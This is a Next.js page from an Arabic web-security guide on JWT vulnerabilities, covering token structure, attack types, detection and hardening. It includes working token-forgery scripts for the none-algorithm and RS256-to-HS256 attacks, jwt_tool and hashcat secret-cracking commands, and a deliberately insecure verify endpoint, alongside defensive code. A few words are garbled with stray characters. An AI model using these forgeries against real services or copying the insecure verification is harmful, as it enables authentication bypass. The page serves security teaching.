import Link from 'next/link';
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'
import ShareButtons from '@/components/ShareButtons'

export const metadata = {
  title: 'ثغرات JWT - JSON Web Token Vulnerabilities | دليل أمن الويب',
  description: 'دليل شامل عن ثغرات JWT وتشيكات الأمان وطرق الحماية والكشف',
};

export default function JWTVulnerabilitiesPage() {
  return (
    <div dir="rtl" className="min-h-screen bg-gray-900 text-gray-100">
      {/* Header */}
      <header className="bg-gradient-to-l from-purple-900 to-indigo-900 py-16">
        <div className="container mx-auto px-4 max-w-4xl">
          <Link
            href="/"
            className="text-purple-300 hover:text-purple-200 text-sm mb-4 inline-block"
          >
            العودة للرئيسية
          </Link>
          <h1 className="text-4xl font-bold text-white mb-4">
            ثغرات JWT - JSON Web Token Vulnerabilities
          </h1>
          <p className="text-xl text-purple-200">
            دليل شامل عن أمن التوقيعات الرقمية وتشفير البيانات
          </p>
        </div>
      </header>

      <div className="mb-6">
        <ShareButtons title="JWT Vulnerabilities" url={"https://web-security-guide.vercel.app/vulnerabilities/jwt"} />
      </div>

      <main className="container mx-auto px-4 max-w-4xl py-12">
        {/* Table of Contents */}
        <nav className="bg-gray-800 rounded-xl p-6 mb-10 border border-gray-700">
          <h2 className="text-lg font-bold mb-4 text-purple-300">محتويات الصفحة</h2>
          <ul className="space-y-2 text-sm">
            <li><a href="#definition" className="text-gray-300 hover:text-white">1. تعريف JWT وبنيته</a></li>
            <li><a href="#vulnerabilities" className="text-gray-300 hover:text-white">2. أنواع ثغرات JWT</a></li>
            <li><a href="#examples" className="text-gray-300 hover:text-white">3. أمثلة حقيقية بالكود</a></li>
            <li><a href="#detection" className="text-gray-300 hover:text-white">4. كيف تكشف ثغرات JWT</a></li>
            <li><a href="#prevention" className="text-gray-300 hover:text-white">5. كيف تحمي تطبيقاتك</a></li>
            <li><a href="#tips" className="text-gray-300 hover:text-white">6. نصائح وأخطاء شائعة</a></li>
            <li><a href="#navigation" className="text-gray-300 hover:text-white">7. روابط التنقل</a></li>
          </ul>
        </nav>

        {/* Definition */}
        <section id="definition" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            1. تعريف JWT وبنيته
          </h2>

          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold mb-3">ما هو JWT؟</h3>
            <p className="text-gray-300 leading-relaxed mb-4">
              JWT (JSON Web Token) هو معيار مفتوح (RFC 7519) يتم استخدامه لنقل البيانات بين الأطراف بشكل آمن عبر شبكات HTTP. يتكون التوقيع من ثلاثة أجزاء مفرزة بـ <code className="bg-gray-700 px-2 py-1 rounded text-purple-300">.</code> (نقطة):
            </p>

            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm mb-4 overflow-x-auto">
              <span className="text-yellow-300">eyJhbGciOiJIUzI1NiJ9</span>
              <span className="text-gray-500">.</span>
              <span className="text-green-300">eyJzdWIiOiIxMjM0NTY3ODkwIn0</span>
              <span className="text-gray-500">.</span>
              <span className="text-blue-300">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
            </div>

            <div className="grid md:grid-cols-3 gap-4">
              <div className="bg-purple-900/30 rounded-lg p-4 border border-purple-700">
                <h4 className="font-bold text-purple-300 mb-2">Header (الرأس)</h4>
                <p className="text-sm text-gray-300">يحتوي على خوارزمية التوقيع (alg) ونوع التوقيع (typ)</p>
                <pre className="text-xs mt-2 text-gray-400">{"{ \"alg\": \"HS256\", \"typ\": \"JWT\" }"}</pre>
              </div>
              <div className="bg-green-900/30 rounded-lg p-4 border border-green-700">
                <h4 className="font-bold text-green-300 mb-2">Payload (الحمولة)</h4>
                <p className="text-sm text-gray-300">يحتوي على الادعاءات (claims) مثل معرّف المستخدم والصلاحية</p>
                <pre className="text-xs mt-2 text-gray-400">{"{ \"sub\": \"123\", \"role\": \"admin\" }"}</pre>
              </div>
              <div className="bg-blue-900/30 rounded-lg p-4 border border-blue-700">
                <h4 className="font-bold text-blue-300 mb-2">Signature (التوقيع)</h4>
                <p className="text-sm text-gray-300">توقيع مشفر يضمن سلامة التوقيع وعدم التلاعب به</p>
                <pre className="text-xs mt-2 text-gray-400">HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
              </div>
            </div>
          </div>

          <div className="bg-yellow-900/20 border border-yellow-700 rounded-xl p-4">
            <p className="text-yellow-200 text-sm">
              ⚠️ <strong>ملاحظة:</strong> JWT غير مشفّر بشكل افتراضي، أي أن أي شخص يمكنه قراءة محتوى الـ Payload. التوقيع يضمن فقط عدم التلاعب بالبيانات.
            </p>
          </div>
        </section>

        {/* Vulnerabilities */}
        <section id="vulnerabilities" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            2. أنواع ثغرات JWT
          </h2>

          {/* Algorithm Confusion */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Algorithm Confusion Attack</h3>
            <p className="text-gray-300 mb-4">
              هجوم تشويه الخوارزمية يحدث عندما يقبل الخادم خوارزمية مختلفة عما هو متوقع. المهاجم يغيّر خوارزمية التوقيع في Header من <code className="bg-gray-700 px-1 rounded text-purple-300">HS256</code> إلى <code className="bg-gray-700 px-1 rounded text-purple-300">RS256</code> أو العكس، مما يسمح له بتزوير التوقيع.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 text-sm">
              <p className="text-yellow-300 mb-2">السيناريو:</p>
              <ul className="space-y-1 text-gray-300 list-disc list-inside">
                <li>الخادم يستخدم RS256 (مفتاح عام/خاص) للتوقيع</li>
                <li>المهاجم يغيّر Header إلى HS256 (مفتاح مشاركة سري)</li>
                <li>المهاجم يوقّع باستخدام المفتاح العام (الذي يكون متاحاً للجميع)</li>
              </ul>
            </div>
          </div>

          {/* None Algorithm */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 None Algorithm Attack</h3>
            <p className="text-gray-300 mb-4">
              بعض المكتبات تدعم خوارزمية <code className="bg-gray-700 px-1 rounded text-purple-300">none</code> التي لا تقوم بأي توقيع. إذا قبل الخادم هذه الخوارزمية، يمكن للمهاجم تزوير أي توقيع بدون معرفة السر.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-gray-400 mb-2">// Header بعد التعديل:</p>
              <p className="text-red-300">{"{ \"alg\": \"none\", \"typ\": \"JWT\" }"}</p>
              <p className="text-gray-400 mt-3 mb-2">// Payload المزور:</p>
              <p className="text-red-300">{"{ \"sub\": \"admin\", \"role\": \"admin\" }"}</p>
              <p className="text-gray-400 mt-3 mb-2">// التوقيع: فارغ (لا يوجد توقيع)</p>
            </div>
          </div>

          {/* Weak Secret */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Weak Secret / Brute Force</h3>
            <p className="text-gray-300 mb-4">
              إذا كان السر (secret) ضعيفاً أو قصيراً، يمكن اختراقه بهجوم القوة الغاشمة أو من القاموس. هذا شائع جداً في التطبيقات التي تستخدم أسرار مثل <code className="bg-gray-700 px-1 rounded text-purple-300">secret</code> أو <code className="bg-gray-700 px-1 rounded text-purple-300">password123</code>.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 text-sm">
              <p className="text-yellow-300 mb-2">أدوات الاختراق:</p>
              <ul className="space-y-1 text-gray-300 list-disc list-inside">
                <li><code className="bg-gray-700 px-1 rounded">hashcat</code> - لتكسير أسرار JWT</li>
                <li><code className="bg-gray-700 px-1 rounded">jwt_tool</code> - أداة اختبار JWT</li>
                <li><code className="bg-gray-700 px-1 rounded">John the Ripper</code> - لتكسير كلمات المرور</li>
              </ul>
            </div>
          </div>

          {/* Key Leakage */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Key Leakage</h3>
            <p className="text-gray-300 mb-4">
              تسريب المفتاح السري يسمح لأي شخص بتوقيع توقيعات JWT صحيحة. يحدث ذلك بسبب:
            </p>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                حفظ المفتاح في كود المصدر (hardcoded)
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                تسريب المفتاح في ملفات السجلات (logs)
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                استخدام متغيرات البيئة غير المشفرة
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                تسريب المفتاح عبر GitHub repositories
              </li>
            </ul>
          </div>

          {/* Insecure Storage */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Insecure Token Storage</h3>
            <p className="text-gray-300 mb-4">
              حفظ JWT في مكان غير آمن يجعله عرضة للسرقة عبر هجمات XSS أو Man-in-the-Middle:
            </p>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-green-900/20 rounded-lg p-4 border border-green-700">
                <h4 className="font-bold text-green-300 text-sm mb-2">✅ آمن</h4>
                <ul className="text-xs text-gray-300 space-y-1 list-disc list-inside">
                  <li>HttpOnly Cookie</li>
                  <li>Secure Cookie</li>
                  <li>SameSite Cookie</li>
                </ul>
              </div>
              <div className="bg-red-900/20 rounded-lg p-4 border border-red-700">
                <h4 className="font-bold text-red-300 text-sm mb-2">❌ غير آمن</h4>
                <ul className="text-xs text-gray-300 space-y-1 list-disc list-inside">
                  <li>localStorage</li>
                  <li>sessionStorage</li>
                  <li>variables in JavaScript</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Missing Expiration */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Missing Expiration (exp)</h3>
            <p className="text-gray-300 mb-4">
              إذا لم يتم تحديد وقت انتهاء الصلاحية للتوقيع، فإن التوkey يبقى صالحاً إلى الأبد حتى بعد تسجيل خروج المستخدم أو تغيير كلمة المرور.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-green-300">// توقيع صالح مع انتهاء صلاحية</p>
              <p className="text-gray-300">{"{ \"exp\": 1719100800, \"iat\": 1719097200 }"}</p>
              <p className="text-red-300 mt-2">// توقيع بدون انتهاء صلاحية ( خطير! )</p>
              <p className="text-gray-300">{"{ \"iat\": 1719097200 }"}</p>
            </div>
          </div>

          {/* Audience and Issuer Validation */}
          <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Missing Audience/Issuer Validation</h3>
            <p className="text-gray-300 mb-4">
              عدم التحقق من حقول <code className="bg-gray-700 px-1 rounded text-purple-300">aud</code> (الجمهور) و <code className="bg-gray-700 px-1 rounded text-purple-300">iss</code> (المصدر) يسمح ب=date reuse attacks حيث يمكن إعادة استخدام توقيع من تطبيق آخر.
            </p>
          </div>
        </section>

        {/* Examples */}
        <section id="examples" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            3. أمثلة حقيقية بالكود
          </h2>

          {/* Example 1: Token Forgery */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">تهريب التوقيع (Token Forgery)</h3>
            <p className="text-gray-300 mb-4">كيف يزور المهاجم توقيع JWT باستخدام None Algorithm:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// 1. تحليل التوقيع الأصلي
const token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

// 2. فك ترميز Header و Payload
const [header, payload, signature] = token.split('.');

// 3. إنشاء Header جديد مع none algorithm
const newHeader = btoa(JSON.stringify({ alg: "none", typ: "JWT" }));

// 4. إنشاء Payload مزور
const newPayload = btoa(JSON.stringify({ 
  user: "admin", 
  role: "admin", 
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 3600
}));

// 5. دمج التوقيع المزور (بدون توقيع)
const forgedToken = newHeader + "." + newPayload + ".";

// النتيجة: توقيع مزور بدون أي توقيع حقيقي
console.log(forgedToken);`}
              </code>
            </pre>
          </div>

          {/* Example 2: Algorithm Switching */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">تبديل الخوارزمية (Algorithm Switching)</h3>
            <p className="text-gray-300 mb-4">هجوم تبديل الخوارزمية من RS256 إلى HS256:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// الهجوم: الخادم يستخدم RS256 (مفتاح عام/خاص)
// المهاجم يحوّل الهجوم إلى HS256 (مفتاح مشاركة سري)

const jwt = require('jsonwebtoken');
const fs = require('fs');

// 1. المهاجم يحصل على المفتاح العام (public key) من الخادم
const publicKey = fs.readFileSync('public.pem');

// 2. يقرأ التوقيع الأصلي ويغيّر Header
//原本: { "alg": "RS256" } → جديد: { "alg": "HS256" }

// 3. يستخدم المفتاح العام كمفتاح سري لتوقيع HS256
const forgedPayload = { user: "admin", role: "admin" };
const forgedToken = jwt.sign(forgedPayload, publicKey, { 
  algorithm: 'HS256' 
});

// 4. الخادم يقبل التوقيع لأنه يستخدم نفس المفتاح للتحقق
// (الخطأ: عدم التحقق من الخوارزمية المقبولة)`}
              </code>
            </pre>
          </div>

          {/* Example 3: Weak Secret Cracking */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">تكسير السر الضعيف (Weak Secret Cracking)</h3>
            <p className="text-gray-300 mb-4">كيف يتكسر JWT بمفتاح ضعيف:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// باستخدام jwt_tool
// pip install jwt_tool

// 1. استخراج التوقيع
jwt_tool.py <JWT_TOKEN>

// 2. تحليل التوقيع
jwt_tool.py <JWT_TOKEN> -T

// 3. محاولة تكسير السر من القاموس
jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt

// باستخدام Node.js مع hashcat:
// 1. استخراج الـ hash
node -e "
const jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
const [header, payload, sig] = jwt.split('.');
console.log(\`eyJhbGciOiJIUzI1NiJ9.\${payload}.\${sig}:\`);
" > hash.txt

// 2. تكسير باستخدام hashcat
hashcat -m 16500 hash.txt wordlist.txt`}
              </code>
            </pre>
          </div>

          {/* Example 4: Server-side Vulnerability */}
          <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">ثغرة في الخادم (Server-Side Vulnerability)</h3>
            <p className="text-gray-300 mb-4">كود خادم غير آمن لا يتحقق من الخوارزمية:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// ❌ كود غير آمن (Node.js + Express)
const jwt = require('jsonwebtoken');

app.post('/api/verify', (req, res) => {
  const { token } = req.body;
  
  try {
    // الخطأ: عدم تحديد الخوارزمية المقبولة
    const decoded = jwt.verify(token, SECRET_KEY);
    // المهاجم يمكنه استخدام alg: "none"
    res.json({ user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// ✅ كود آمن
app.post('/api/verify', (req, res) => {
  const { token } = req.body;
  
  try {
    const decoded = jwt.verify(token, SECRET_KEY, {
      algorithms: ['HS256'],  // تحديد الخوارزمية المقبولة
      audience: 'myapp.com', // التحقق من الجمهور
      issuer: 'auth.myapp.com', // التحقق من المصدر
      maxAge: '1h' // حد أقصى للعمر
    });
    res.json({ user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});`}
              </code>
            </pre>
          </div>
        </section>

        {/* Detection */}
        <section id="detection" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            4. كيف تكشف ثغرات JWT
          </h2>

          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="font-bold text-blue-300 mb-3">أدوات الاختبار</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>jwt_tool</strong>
                    <p className="text-xs text-gray-400">أداة Python شاملة لاختبار JWT</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>jwt.io</strong>
                    <p className="text-xs text-gray-400">موقع ويب لفك ترميز JWT وتحليله</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>Burp Suite</strong>
                    <p className="text-xs text-gray-400">插件 لتحليل JWT في حركة المرور</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>hashcat</strong>
                    <p className="text-xs text-gray-400">لتكسير أسرار JWT القوية</p>
                  </div>
                </li>
              </ul>
            </div>

            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="font-bold text-blue-300 mb-3">علامات الثغرة</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>Header يحتوي على alg: none</strong>
                    <p className="text-xs text-gray-400">يدعم None Algorithm</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>عدم وجود exp claim</strong>
                    <p className="text-xs text-gray-400">التوقيع بدون انتهاء صلاحية</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>سر ضعيف</strong>
                    <p className="text-xs text-gray-400">كلمات مرور شائعة أو قصيرة</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>عدم التحقق من aud/iss</strong>
                    <p className="text-xs text-gray-400">لا يتم التحقق من الحقول المطلوبة</p>
                  </div>
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-gray-800 rounded-xl p-6 mt-6 border border-gray-700">
            <h3 className="font-bold text-blue-300 mb-3">فحص يدوي بـ Python</h3>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`import base64
import json

def analyze_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        print("❌ غير صالح: يجب أن يكون هناك 3 أجزاء")
        return
    
    # فك ترميز Header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    print(f"📋 Header: {json.dumps(header, indent=2)}")
    
    # فحص الخوارزمية
    alg = header.get('alg', '')
    if alg.lower() == 'none':
        print("🔴 خطر: يدعم None Algorithm!")
    elif alg not in ['HS256', 'HS384', 'HS512']:
        print(f"⚠️ تحذير: خوارزمية غير معتادة: {alg}")
    
    # فحص Payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    print(f"📋 Payload: {json.dumps(payload, indent=2)}")
    
    if 'exp' not in payload:
        print("⚠️ تحذير: لا يوجد انتهاء صلاحية (exp)")
    if 'aud' not in payload:
        print("⚠️ تحذير: لا يوجد حقل الجمهور (aud)")
    if 'iss' not in payload:
        print("⚠️ تحذير: لا يوجد حقل المصدر (iss)")`}
              </code>
            </pre>
          </div>
        </section>

        {/* Prevention */}
        <section id="prevention" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            5. كيف تحمي تطبيقاتك
          </h2>

          <div className="space-y-6">
            {/* Strong Secrets */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">1. استخدام أسرار قوية</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ❌ سر ضعيف
const SECRET = "secret";
const SECRET = "password123";
const SECRET = "jwt_secret";

// ✅ سر قوي (256 بت على الأقل)
const crypto = require('crypto');
const SECRET = crypto.randomBytes(64).toString('hex');
// أو
const SECRET = process.env.JWT_SECRET; // من متغيرات البيئة

// التحقق من قوة السر في الخادم
function validateSecret(secret) {
  if (secret.length < 32) {
    throw new Error('JWT secret must be at least 32 characters');
  }
}`}
                </code>
              </pre>
            </div>

            {/* Algorithm Validation */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">2. تقييد الخوارزميات</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ تحديد الخوارزمية المقبولة صراحةً
const decoded = jwt.verify(token, SECRET, {
  algorithms: ['HS256'], // فقط HS256
});

// ✅ للتوقيعات غير القابلة للتلاعب (RS256)
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
});

// ✅ في middleware التحقق
function verifyToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'Token required' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],
      audience: process.env.APP_AUDIENCE,
      issuer: process.env.APP_ISSUER,
    });
    
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}`}
                </code>
              </pre>
            </div>

            {/* Expiration */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">3. تحديد انتهاء الصلاحية</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ عند إنشاء التوقيع
const token = jwt.sign(
  { 
    user: userId, 
    role: userRole 
  },
  SECRET,
  { 
    expiresIn: '1h',    // انتهاء بعد ساعة
    algorithm: 'HS256',
    audience: 'myapp.com',
    issuer: 'auth.myapp.com',
  }
);

// ✅ التحقق من انتهاء الصلاحية تلقائياً
jwt.verify(token, SECRET, { 
  algorithms: ['HS256'],
  maxAge: '2h', // حد أقصى للعمر
});

// ✅ التحقق من الصلاحيات (JWT Claims)
const decoded = jwt.verify(token, SECRET, {
  algorithms: ['HS256'],
  complete: true, // إرجاع Header و Payload
});`}
                </code>
              </pre>
            </div>

            {/* Secure Storage */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">4. التخزين الآمن</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ استخدام HttpOnly Cookie
res.cookie('token', token, {
  httpOnly: true,     // لا يمكن الوصول عبر JavaScript
  secure: true,       // فقط HTTPS
  sameSite: 'strict', // حماية من CSRF
  maxAge: 3600000,    // ساعة واحدة
  path: '/',
});

// ✅ في Next.js مع Cookies
import { cookies } from 'next/headers';

// تعيين التوقيع
cookies().set('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 3600,
});

// قراءة التوقيع
const token = cookies().get('token')?.value;

// ❌ خطأ شائع: التخزين في localStorage
localStorage.setItem('token', token); // خطر XSS`}
                </code>
              </pre>
            </div>

            {/* Token Revocation */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">5. إلغاء التوقيعات</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ استخدام黑名单 للتوقيعات الملغاة
const blacklist = new Set();

function revokeToken(token) {
  blacklist.add(token);
}

function isTokenRevoked(token) {
  return blacklist.has(token);
}

// ✅ في middleware التحقق
function verifyToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (isTokenRevoked(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  // ... باقي التحقق
}

// ✅ باستخدام Redis للإنتاج
const Redis = require('ioredis');
const redis = new Redis();

async function revokeToken(token, ttl) {
  await redis.set(\`revoked:\${token}\`, '1', 'EX', ttl);
}

async function isTokenRevoked(token) {
  const result = await redis.get(\`revoked:\${token}\`);
  return result === '1';
}`}
                </code>
              </pre>
            </div>
          </div>
        </section>

        {/* Tips */}
        <section id="tips" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            6. نصائح وأخطاء شائعة
          </h2>

          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-green-900/20 rounded-xl p-6 border border-green-700">
              <h3 className="font-bold text-green-300 mb-4 text-lg">✅ أفضل الممارسات</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  استخدام مكتبات موثوقة ومجربة
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تحديد الخوارزمية صراحةً عند التحقق
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  استخدام أسرار قوية (256+ بت)
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تحديد وقت انتهاء الصلاحية دائماً
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  التحقق من حقول aud و iss و sub
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  استخدام HttpOnly Cookie للتخزين
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تحديث المكتبات بانتظام
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تسجيل محاولات الدخول الفاشلة
                </li>
              </ul>
            </div>

            <div className="bg-red-900/20 rounded-xl p-6 border border-red-700">
              <h3 className="font-bold text-red-300 mb-4 text-lg">❌ أخطاء شائعة</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  استخدام none algorithm
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  تخزين التوقيع في localStorage
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  استخدام أسرار قصيرة أو شائعة
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم تحديد انتهاء الصلاحية
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم التحقق من الخوارزمية
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم استخدام HTTPS
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم تحديث المكتبات
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم تسجيل الأحداث الأمنية
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-blue-900/20 rounded-xl p-6 mt-6 border border-blue-700">
            <h3 className="font-bold text-blue-300 mb-3">📦 مكتبات JWT الموصى بها</h3>
            <div className="grid md:grid-cols-3 gap-4 text-sm">
              <div className="bg-gray-800 rounded-lg p-4">
                <h4 className="font-bold text-purple-300">Node.js</h4>
                <ul className="text-gray-300 mt-2 space-y-1">
                  <li>• jsonwebtoken</li>
                  <li>• jose</li>
                  <li>• next-auth</li>
                </ul>
              </div>
              <div className="bg-gray-800 rounded-lg p-4">
                <h4 className="font-bold text-purple-300">Python</h4>
                <ul className="text-gray-300 mt-2 space-y-1">
                  <li>• PyJWT</li>
                  <li>• python-jose</li>
                  <li>• Authlib</li>
                </ul>
              </div>
              <div className="bg-gray-800 rounded-lg p-4">
                <h4 className="font-bold text-purple-300">PHP</h4>
                <ul className="text-gray-300 mt-2 space-y-1">
                  <li>• firebase/php-jwt</li>
                  <li>• lcobucci/jwt</li>
                </ul>
              </div>
            </div>
          </div>
        </section>

        <LabsSection slug="jwt" />
        <ToolsSection slug="jwt" />
        <Quiz slug="jwt" />
        <VideoSection slug="jwt" />

        {/* Navigation */}
        <section id="navigation" className="mb-12">
          <h2 className="text-2xl font-bold text-purple-300 mb-6 border-b border-purple-700 pb-2">
            7. روابط التنقل
          </h2>

          <div className="grid md:grid-cols-2 gap-4">
            <Link
              href="/"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-purple-600 transition-colors block"
            >
              <h3 className="font-bold text-purple-300">🏠 الرئيسية</h3>
              <p className="text-sm text-gray-400 mt-1">العودة لصفحة الدليل الرئيسية</p>
            </Link>

            <Link
              href="/vulnerabilities"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-purple-600 transition-colors block"
            >
              <h3 className="font-bold text-purple-300">🛡️ قائمة الثغرات</h3>
              <p className="text-sm text-gray-400 mt-1">عرض جميع ثغرات أمن الويب</p>
            </Link>

            <Link
              href="/vulnerabilities/xss"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-purple-600 transition-colors block"
            >
              <h3 className="font-bold text-purple-300">💉 ثغرات XSS</h3>
